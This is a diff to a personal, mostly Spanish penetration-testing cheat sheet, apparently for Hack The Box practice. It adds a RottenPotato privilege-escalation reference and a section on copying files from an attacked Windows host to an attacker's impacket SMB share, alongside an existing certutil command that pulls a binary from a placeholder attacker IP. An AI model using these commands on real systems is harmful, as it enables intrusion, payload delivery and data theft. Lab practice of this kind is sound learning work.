@@ -105,6 +105,16 @@ PS C:\Users\Public\Desktop> echo $target
 whoami /priv
 ```
 
+#### rottenPotato
+SeImpersonatePrivilege token, which means that this machine is going to be vulnerable to the RottenPotato exploit
+[RottenPotato](https://github.com/ohpe/juicy-potato/releases)
+
+aplication:
+
+[here!](https://codewithnoah.com/posts/htb-walkthrough-jeeves)
+
+[hackthebox machine espanol](https://www.youtube.com/watch?v=wvWxXKKFifQ&feature=youtu.be)
+
 #### powerSploit
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
 
@@ -139,6 +149,24 @@ Y (yes)
 
 > en la maquina escribir
 >> ```certutil.exe -f -urlcache -split http://myIpAdress/theBinary.exe thebinary.exe```
+
+## descargar archivos desde la maquina
+
+desde mi maquina de atacante debo crear un recurso compartido
+
+```Python
+impacket-smbserver smbFolder $(pwd)
+```
+
+desde la maquina windows que esta siendo atacada usando una poweshell y usando una utilidad de la misma realizamos la sincronizacion con mi equipo
+
+```Python
+New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\MYIP\smbFolder"
+```
+
+```Python
+copy text.txt SharedFolder:\text.txt
+```
 
 ## samba and rpc cheatsheets
 
